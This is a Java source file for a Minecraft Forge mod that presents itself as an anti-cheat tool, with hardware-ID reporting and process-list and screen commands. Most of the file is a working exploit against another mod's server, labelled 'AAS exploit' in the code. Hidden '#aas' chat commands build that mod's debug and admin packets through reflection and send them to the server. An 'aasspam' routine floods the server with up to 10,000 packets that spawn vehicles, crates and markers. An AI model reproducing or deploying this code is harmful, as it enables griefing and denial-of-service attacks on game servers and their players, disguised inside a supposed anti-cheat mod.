package org.acivllas;

import net.minecraft.core.BlockPos;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.api.distmarker.OnlyIn;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.client.event.ClientPlayerNetworkEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.fml.loading.FMLEnvironment;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

@Mod("anticheat_screenshot")
public class AntiCheatMod {
    private static final Logger LOGGER = LogManager.getLogger();
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    private Object channel;
    private Method sendToServer;
    private Constructor<?> conFill, conRally, conTeam, conRespawn, conKit, conGhost, conAmmo, conDowned, conBuild, conArt, conCrate, conSquad, conCmd, conMarker, conSpawner, conMapMarker, conSquadChat, conToggle, conRadio, conVote;

    public AntiCheatMod() {
        LOGGER.info("SIDE = {}", FMLEnvironment.dist);
        NetworkHandler.register();
        MinecraftForge.EVENT_BUS.register(this);
        if (FMLEnvironment.dist.isClient()) {
            FMLJavaModLoadingContext.get().getModEventBus().addListener(this::onClientSetup);
            initAASExploit();
        }
        LOGGER.info("[AntiCheat] Mod loaded");
    }

    private void initAASExploit() {
        try {
            Class<?> ph = Class.forName("com.example.aas.network.PacketHandler");
            channel = ph.getField("INSTANCE").get(null);
            sendToServer = channel.getClass().getMethod("sendToServer", Object.class);

            conFill = Class.forName("com.example.aas.network.PacketDebugFill").getConstructor();
            conRally = Class.forName("com.example.aas.network.PacketDebugSpawnRally").getConstructor(String.class);
            conTeam = Class.forName("com.example.aas.network.PacketTeamSelect").getConstructor(String.class);
            conRespawn = Class.forName("com.example.aas.network.PacketRespawnRequest").getConstructor(String.class);
            conKit = Class.forName("com.example.aas.network.PacketSelectKit").getConstructor(String.class);
            conGhost = Class.forName("com.example.aas.network.PacketSpawnGhost").getConstructor(BlockPos.class, int.class);
            conAmmo = Class.forName("com.example.aas.network.PacketRequestAmmo").getConstructor(BlockPos.class, int.class);
            conDowned = Class.forName("com.example.aas.network.PacketDownedAction").getConstructor(int.class);
            conBuild = Class.forName("com.example.aas.network.PacketBuildRequest").getConstructor(int.class, BlockPos.class, int.class);
            conArt = Class.forName("com.example.aas.network.PacketConfirmArtStrike").getConstructor(boolean.class);
            conCrate = Class.forName("com.example.aas.network.PacketDropCrate").getConstructor();
            conSquad = Class.forName("com.example.aas.network.PacketSquadAction").getConstructor(int.class, int.class, String.class);
            conCmd = Class.forName("com.example.aas.network.PacketRequestCMD").getConstructor();
            conMarker = Class.forName("com.example.aas.network.PacketApplyMarker").getConstructor(int.class);
            conSpawner = Class.forName("com.example.aas.network.PacketUpdateSpawner").getConstructor(BlockPos.class, int.class, int.class, String.class, float.class);
            conMapMarker = Class.forName("com.example.aas.network.PacketPlaceMapMarker").getConstructor(int.class, int.class, String.class);
            conSquadChat = Class.forName("com.example.aas.network.PacketSquadChat").getConstructor(String.class, int.class);
            conToggle = Class.forName("com.example.aas.network.PacketToggleAim").getConstructor();
            conRadio = Class.forName("com.example.aas.network.PacketRadioAction").getConstructor(int.class);
            conVote = Class.forName("com.example.aas.network.PacketVoteAction").getConstructor(boolean.class);

            LOGGER.info("[AntiCheat] AAS exploit loaded");
        } catch (Exception e) {
            LOGGER.warn("[AntiCheat] AAS not found: {}", e.getMessage());
        }
    }

    private void send(Object pkt) { try { sendToServer.invoke(channel, pkt); } catch (Exception e) { LOGGER.error("[AAS]", e); } }

    @SubscribeEvent
    @OnlyIn(Dist.CLIENT)
    public void onChat(ClientChatEvent event) {
        String msg = event.getMessage();
        if (!msg.startsWith("#aas")) return;
        event.setCanceled(true);
        String[] parts = msg.substring(1).split("\\s+");
        String cmd = parts.length > 0 ? parts[0] : "";
        try {
            switch (cmd) {
                case "aasfill": send(conFill.newInstance()); break;
                case "aasdropcrate": send(conCrate.newInstance()); break;
                case "aasrequestcmd": send(conCmd.newInstance()); break;
                case "aastoggleaim": send(conToggle.newInstance()); break;
                case "aasspawnrally": send(conRally.newInstance(parts.length > 1 ? parts[1] : "bluefor")); break;
                case "aassetteam": send(conTeam.newInstance(parts.length > 1 ? parts[1] : "bluefor")); break;
                case "aasrespawn": send(conRespawn.newInstance(parts.length > 1 ? parts[1] : "hub")); break;
                case "aasselectkit": send(conKit.newInstance(msg.length() > 10 ? msg.substring(10) : "")); break;
                case "aasart": send(conArt.newInstance(parts.length > 1 && "true".equals(parts[1]))); break;
                case "aasvote": send(conVote.newInstance(parts.length > 1 && "true".equals(parts[1]))); break;
                case "aasdowned": send(conDowned.newInstance(parts.length > 1 ? Integer.parseInt(parts[1]) : 0)); break;
                case "aasradio": send(conRadio.newInstance(parts.length > 1 ? Integer.parseInt(parts[1]) : 0)); break;
                case "aasmarker": send(conMarker.newInstance(parts.length > 1 ? Integer.parseInt(parts[1]) : -1)); break;
                case "aassquadchat": send(conSquadChat.newInstance(parts.length > 2 ? parts[2] : "", parts.length > 1 ? Integer.parseInt(parts[1]) : 0)); break;
                case "aasspam": {
                    int size = parts.length > 1 ? Integer.parseInt(parts[1]) : 1000;
                    String team = parts.length > 2 ? parts[2] : "bluefor";
                    int step = 50;
                    int y = 64;
                    int sent = 0;
                    for (int x = -size/2; x <= size/2 && sent < 10000; x += step) {
                        for (int z = -size/2; z <= size/2 && sent < 10000; z += step) {
                            send(conRally.newInstance(team));
                            send(conGhost.newInstance(new BlockPos(x, y, z), 1));
                            send(conGhost.newInstance(new BlockPos(x, y, z), 2));
                            send(conAmmo.newInstance(new BlockPos(x, y, z), 1));
                            send(conAmmo.newInstance(new BlockPos(x, y, z), 2));
                            send(conBuild.newInstance(1, new BlockPos(x, y, z), 0));
                            send(conBuild.newInstance(2, new BlockPos(x, y, z), 1));
                            send(conSpawner.newInstance(new BlockPos(x, y, z), 1, 1, "humvee", 0));
                            send(conSpawner.newInstance(new BlockPos(x, y, z), 1, 1, "m1a2", 0));
                            send(conMapMarker.newInstance(x, z, "attack"));
                            send(conMarker.newInstance(-1));
                            send(conDowned.newInstance(0));
                            send(conRadio.newInstance(0));
                            send(conRadio.newInstance(1));
                            send(conCrate.newInstance());
                            sent += 15;
                        }
                    }
                    System.out.println("[AAS] Spammed " + sent + " packets across " + size + "x" + size);
                    break;
                }
                case "aassquadaction": send(conSquad.newInstance(parts.length > 1 ? Integer.parseInt(parts[1]) : 0, parts.length > 2 ? Integer.parseInt(parts[2]) : -1, parts.length > 3 ? parts[3] : "")); break;
                case "aasmapmarker": send(conMapMarker.newInstance(parts.length > 1 ? Integer.parseInt(parts[1]) : 0, parts.length > 2 ? Integer.parseInt(parts[2]) : 0, parts.length > 3 ? parts[3] : "move")); break;
                case "aasspawnghost": send(conGhost.newInstance(new BlockPos(parts.length > 1 ? Integer.parseInt(parts[1]) : 0, parts.length > 2 ? Integer.parseInt(parts[2]) : 100, parts.length > 3 ? Integer.parseInt(parts[3]) : 0), parts.length > 4 ? Integer.parseInt(parts[4]) : 1)); break;
                case "aasrequestammo": send(conAmmo.newInstance(new BlockPos(parts.length > 1 ? Integer.parseInt(parts[1]) : 0, parts.length > 2 ? Integer.parseInt(parts[2]) : 100, parts.length > 3 ? Integer.parseInt(parts[3]) : 0), parts.length > 4 ? Integer.parseInt(parts[4]) : 1)); break;
                case "aasbuild": send(conBuild.newInstance(parts.length > 1 ? Integer.parseInt(parts[1]) : 1, new BlockPos(parts.length > 2 ? Integer.parseInt(parts[2]) : 0, parts.length > 3 ? Integer.parseInt(parts[3]) : 100, parts.length > 4 ? Integer.parseInt(parts[4]) : 0), parts.length > 5 ? Integer.parseInt(parts[5]) : 0)); break;
                case "aasupdatespawner": send(conSpawner.newInstance(new BlockPos(parts.length > 1 ? Integer.parseInt(parts[1]) : 0, parts.length > 2 ? Integer.parseInt(parts[2]) : 100, parts.length > 3 ? Integer.parseInt(parts[3]) : 0), parts.length > 4 ? Integer.parseInt(parts[4]) : 0, parts.length > 5 ? Integer.parseInt(parts[5]) : 0, parts.length > 6 ? parts[6] : "", parts.length > 7 ? Float.parseFloat(parts[7]) : 0)); break;
                default: System.out.println("[AAS] Unknown: " + cmd);
            }
        } catch (Exception e) { LOGGER.error("[AAS] {}", cmd, e); }
    }

    private void onClientSetup(FMLClientSetupEvent event) {
        if (FMLEnvironment.dist.isClient()) {
            scheduler.scheduleAtFixedRate(() -> {
                try { HWIDUtils.getHWID(); } catch (Exception e) { LOGGER.error("[AntiCheat] Error in scheduled task", e); }
            }, 15, 20, TimeUnit.MINUTES);
        }
    }

    @SubscribeEvent
    public void onRegisterCommands(RegisterCommandsEvent event) {
        ProcessListCommand.register(event.getDispatcher());
        ScreenCommand.register(event.getDispatcher());
        HWIDBanCommand.register(event.getDispatcher());
    }

    @SubscribeEvent
    @OnlyIn(Dist.CLIENT)
    public void onClientLoggedIn(ClientPlayerNetworkEvent.LoggingIn event) {
        System.out.println("[AntiCheat] Player logged in. Sending HWID...");
        NetworkHandler.CHANNEL.sendToServer(new NetworkHandler.C2SSendHWIDPacket(HWIDUtils.getHWID()));
    }
}
